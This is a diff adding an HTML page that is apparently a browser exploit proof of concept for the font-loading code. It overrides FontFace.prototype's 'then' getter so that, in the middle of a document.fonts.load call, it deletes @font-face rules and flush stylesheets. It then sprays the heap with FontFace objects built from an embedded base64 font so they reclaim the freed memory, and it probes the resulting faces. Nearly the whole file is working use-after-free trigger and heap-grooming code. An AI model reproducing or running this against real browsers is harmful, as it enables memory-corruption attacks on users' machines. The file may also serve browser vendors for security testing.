@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<style id="s">
+@font-face { font-family: prepad; src: url(nonexistent-prepad.woff); unicode-range: U+E123; }
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
+</head>
+<body>
+<canvas id="c" width="512" height="128"></canvas>
+<script>
+"use strict";
+
+let spray = [];
+let keep = [];
+
+const PAD = 0x22;
+const FLUSH = 0x240;
+const SPRAY_COUNT = FLUSH + PAD + 0x300;
+
+const FONT_B64 = "d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
+const FONT_BYTES = (() => {
+    const s = atob(FONT_B64);
+    const bytes = new Uint8Array(s.length);
+    for (let i = 0; i < s.length; i++)
+        bytes[i] = s.charCodeAt(i);
+    return bytes;
+})();
+
+function makeFontBuffer() {
+    const copy = new Uint8Array(FONT_BYTES.length);
+    copy.set(FONT_BYTES);
+    return copy.buffer;
+}
+
+function forceStyle() {
+    void document.body.offsetTop;
+}
+
+function addPads() {
+    const sheet = document.getElementById("s").sheet;
+    for (let i = 0; i < PAD; i++)
+        sheet.insertRule(`@font-face { font-family: pad${i}; src: url(nonexistent-pad-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
+    forceStyle();
+}
+
+function addFlushRules() {
+    const st = document.createElement("style");
+    st.id = "flush";
+    document.head.appendChild(st);
+    const sheet = st.sheet;
+    for (let i = 0; i < FLUSH; i++)
+        sheet.insertRule(`@font-face { font-family: flush${i}; src: url(nonexistent-flush-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
+    forceStyle();
+}
+
+function deleteFlushRules() {
+    const sheet = document.getElementById("flush").sheet;
+    while (sheet.cssRules.length)
+        sheet.deleteRule(0);
+    forceStyle();
+}
+
+function killFontFaceSetCache() {
+    const f = new FontFace("cachekill" + keep.length, "local(Helvetica)", { unicodeRange: "U+E124" });
+    document.fonts.add(f);
+    keep.push(f);
+}
+
+function cssFontFaceBufferSpray() {
+    for (let i = 0; i < SPRAY_COUNT; i++) {
+        const f = new FontFace("BUFFER_RECLAIM_" + i, makeFontBuffer(), { unicodeRange: "U+0041" });
+        spray.push(f);
+    }
+}
+
+function probeFace(face) {
+    keep.push(face.family);
+    keep.push(face.style);
+    keep.push(face.weight);
+    keep.push(face.stretch);
+    keep.push(face.unicodeRange);
+    keep.push(face.featureSettings);
+    keep.push(face.display);
+    keep.push(face.status);
+
+    const ctx = document.getElementById("c").getContext("2d");
+    ctx.font = "64px " + face.family;
+    const metrics = ctx.measureText("AAAAIIIIWWWW");
+    keep.push(metrics.width);
+    keep.push(metrics.actualBoundingBoxLeft);
+    keep.push(metrics.actualBoundingBoxRight);
+
+    const div = document.createElement("div");
+    div.textContent = "AAAAIIIIWWWW";
+    div.style.cssText = "position:absolute;left:-10000px;top:0;font:64px " + face.family;
+    document.body.appendChild(div);
+    keep.push(div.offsetWidth);
+    document.body.removeChild(div);
+}
+
+window.onload = () => {
+    const trigger = new FontFace("trigger", "local(Helvetica)", { unicodeRange: "U+0041" });
+    document.fonts.add(trigger);
+    void trigger.loaded;
+
+    addPads();
+    addFlushRules();
+
+    let fired = false;
+    Object.defineProperty(FontFace.prototype, "then", {
+        configurable: true,
+        get() {
+            if (!fired && this === trigger) {
+                fired = true;
+                const sheet = document.getElementById("s").sheet;
+                killFontFaceSetCache();
+                sheet.deleteRule(1);
+                forceStyle();
+                deleteFlushRules();
+                cssFontFaceBufferSpray();
+            }
+            return undefined;
+        }
+    });
+
+    document.fonts.load("1em trigger, x", "AB").then(faces => {
+        keep.push(faces);
+        for (const face of faces)
+            probeFace(face);
+        for (const face of document.fonts)
+            probeFace(face);
+    }, err => keep.push(err));
+};
+</script>
+</body>
+</html>
